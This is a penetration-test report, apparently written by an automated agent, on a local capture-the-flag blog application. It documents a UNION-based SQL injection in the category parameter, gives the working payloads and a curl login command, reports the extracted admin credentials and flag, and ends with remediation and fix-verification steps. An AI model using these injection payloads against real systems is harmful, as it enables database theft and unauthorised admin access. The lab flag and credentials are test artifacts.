# Security Assessment Report: Blog Application - SQL Injection leading to Admin Credential Exfiltration

## TL;DR
- **Objective:** Login as the admin user by dumping the admins table
- **Outcome:** ACHIEVED - Successfully extracted admin credentials and obtained flag
- **Highest-impact finding:** UNION-based SQL injection in category filter allowing complete admin table extraction
- **Validation status:** Confirmed admin login with extracted credentials, FLAG retrieved

## Target Information
- **Target:** 127.0.0.1:33055
- **Host / base URL:** http://127.0.0.1:33055/
- **Application or component:** Blog Application
- **Authentication context:** Admin login page at /admin.php, unauthenticated SQLi in category filter
- **Relevant technology details:**
  - PHP/7.4.33 with Apache/2.4.54
  - MySQL 5.7.44 (database: `blog`)
  - MySQL User: `user@172.18.0.3`
  - Session Management: PHPSESSID cookie

## Confirmed Vulnerability

### UNION-based SQL Injection in Category Filter
- **Affected endpoint / component:** GET /?category= parameter on index.php
- **Impact:** Complete extraction of database contents including sensitive credential tables
- **Preconditions:** None - vulnerability is accessible without authentication
- **Exact payload or PoC:**
  ```
  GET /?category=' UNION SELECT username,password,id,4,5,6,7 FROM admins-- -
  ```

### Authentication Bypass via Credential Exfiltration
- **Affected endpoint / component:** POST /admin.php login form
- **Impact:** Administrative access to blog backend via credentials obtained through SQLi
- **Preconditions:** Successful extraction of credentials from admins table via SQL injection
- **Exact payload or PoC:**
  ```
  POST /admin.php
  Content-Type: application/x-www-form-urlencoded
  
  username=admin&password=ONEverySecurePassword123!
  ```

## Steps to Reproduce

### Step 1: Confirm SQL Injection Point
1. Navigate to the blog homepage: `GET http://127.0.0.1:33055/`
2. Test category filter for SQL injection vulnerability:
   ```
   GET /?category=' OR '1'='1
   ```
3. Observe that 11 posts are returned (bypassing category filter), confirming boolean-based SQLi

### Step 2: Determine Query Column Count
1. Test UNION-based injection by incrementing null values to match column count:
   ```
   GET /?category=' UNION SELECT null,null,null,null,null,null,null-- -
   ```
2. Confirm 7 columns in the original query

### Step 3: Extract Admin Credentials
1. Inject UNION query to extract all rows from admins table:
   ```
   GET /?category=' UNION SELECT username,password,id,4,5,6,7 FROM admins-- -
   ```
2. Observe extracted credentials in the page response:
   - **Username:** admin
   - **Password:** ONEverySecurePassword123!

### Step 4: Login as Admin
1. Send POST request to admin login page with extracted credentials:
   ```bash
   curl -X POST "http://127.0.0.1:33055/admin.php" \
     -d "username=admin&password=ONEverySecurePassword123!"
   ```
2. Verify successful login and observe flag in response

## Validation / Evidence

### Validation Token / Flag
```
FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}
```

### Tool Evidence
- **Agent Type:** shell (SQL injection testing)
- **Confidence:** 1.00 (High confidence)
- **Test Coverage:** 25+ SQL injection payloads tested
- **Discovery:** UNION-based SQL injection confirmed with 7-column original query

### Request Evidence

**SQLi Extraction Request:**
```http
GET /?category=' UNION SELECT username,password,id,4,5,6,7 FROM admins-- - HTTP/1.1
Host: 127.0.0.1:33055
```

**Admin Login Request:**
```http
POST /admin.php HTTP/1.1
Host: 127.0.0.1:33055
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

username=admin&password=ONEverySecurePassword123!
```

### Response Evidence
- **SQLi Result:** Successfully extracted username=`admin`, password=`ONEverySecurePassword123!`
- **Login Result:** Response contains `FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}`

### Notes on Reliability / Limitations
- Vulnerability is 100% reliable for data extraction
- No authentication required to exploit SQLi
- All payload attempts succeeded after determining correct column count
- Boolean-based and UNION-based injection both confirmed functional

## Remediation

### Root Cause
The category parameter in the index.php blog homepage dynamically constructs SQL queries using string concatenation without proper parameterization or input sanitization. The application directly injects user-controlled input into the WHERE clause of the SELECT statement, allowing attackers to manipulate query structure.

### Recommended Fix
1. **Use Prepared Statements (Parameterized Queries):**
   ```php
   $stmt = $pdo->prepare("SELECT * FROM posts WHERE category = ?");
   $stmt->execute([$_GET['category']]);
   ```

2. **Input Validation:**
   - Implement whitelist validation for category values
   - Reject any input containing SQL control characters

3. **Least Privilege Database Access:**
   - Ensure the database user for the web application has minimal permissions
   - Remove unnecessary read access to sensitive tables (admins) from application user

### Defense-in-Depth
1. Implement Web Application Firewall (WAF) rules to detect SQL injection patterns
2. Enable proper error handling to prevent information disclosure (display_errors = Off in production)
3. Implement rate limiting on the category endpoint to slow automated exploitation
4. Apply database query logging to detect suspicious patterns

## How to Verify the Fix

1. **Test SQL Injection is Blocked:**
   ```
   GET /?category=' UNION SELECT username,password,id,4,5,6,7 FROM admins-- -
   ```
   **Expected secure result:** No data returned or error page displayed; query is safely escaped/prepared

2. **Test Boolean-Based Blind SQLi:**
   ```
   GET /?category=' OR '1'='1
   ```
   **Expected secure result:** Only posts matching the literal string (or no results) returned, not all posts

3. **Verify Data Extraction Prevented:**
   - Attempt to extract sensitive table data via SQLi
   - **Expected secure result:** No credential data appears in response

4. **Verify Normal Functionality:**
   ```
   GET /?category=Nature
   ```
   **Expected secure result:** Posts filtered by "Nature" category display correctly

## Remaining Leads

### Confirmed Blockers
- **admin.php login form SQLi:** After 25+ payload attempts, the admin.php login page was determined NOT vulnerable to SQL injection. Testing included basic boolean-based, time-based, and union-based techniques.

### Unverified Leads
- None - objective successfully achieved

### Missing Context
- Internal admin panel functionality (post-exploitation scope not tested)
- Additional database tables beyond admins, comments, and posts
- Whether the admin password is reused across multiple accounts

---
**Report Generated:** Security Assessment  
**Assessment Methodology:** Dynamic application security testing with confirmed exploitation  
**Evidence Source:** Shell-based SQL injection testing, direct HTTP request/response analysis
